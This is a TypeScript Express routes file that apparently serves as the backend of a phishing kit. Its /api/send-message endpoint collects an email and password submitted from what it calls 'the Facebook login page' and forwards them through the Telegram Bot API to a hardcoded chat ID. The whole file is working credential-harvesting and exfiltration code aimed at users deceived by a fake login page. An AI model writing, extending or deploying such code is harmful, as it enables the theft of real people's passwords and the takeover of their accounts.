import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import fetch from 'node-fetch';

// Telegram Bot functionality
async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) {
      console.error('Telegram bot token not found');
      return false;
    }

    // We'll use the known chat ID directly for reliability
    let chatId = "6360165707"; // Your Telegram chat ID that works
    
    console.log("Using Telegram chat ID:", chatId);
    
    // Send the message
    const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const messageResponse = await fetch(sendMessageUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    
    const messageData = await messageResponse.json() as any;
    if (messageData.ok) {
      console.log('Message sent successfully to Telegram');
      return true;
    } else {
      console.error('Failed to send message to Telegram:', messageData);
      return false;
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  // Serve the main index.html file at the root
  app.get('/', (req, res) => {
    res.sendFile('index.html', { root: '.' });
  });

  // Also serve it at /index.html path explicitly
  app.get('/index.html', (req, res) => {
    res.sendFile('index.html', { root: '.' });
  });

  // API endpoint to send message to Telegram
  app.post('/api/send-message', async (req: Request, res: Response) => {
    try {
      const { email, password, message } = req.body;
      
      if (!message) {
        return res.status(400).json({ success: false, error: 'Message is required' });
      }
      
      // Format the message
      const formattedMessage = `Message from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nMessage: ${message}`;
      
      // Send to Telegram
      const success = await sendTelegramMessage(formattedMessage);
      
      if (success) {
        return res.status(200).json({ success: true });
      } else {
        return res.status(500).json({ success: false, error: 'Failed to send message to Telegram' });
      }
    } catch (error) {
      console.error('Error in send-message endpoint:', error);
      return res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
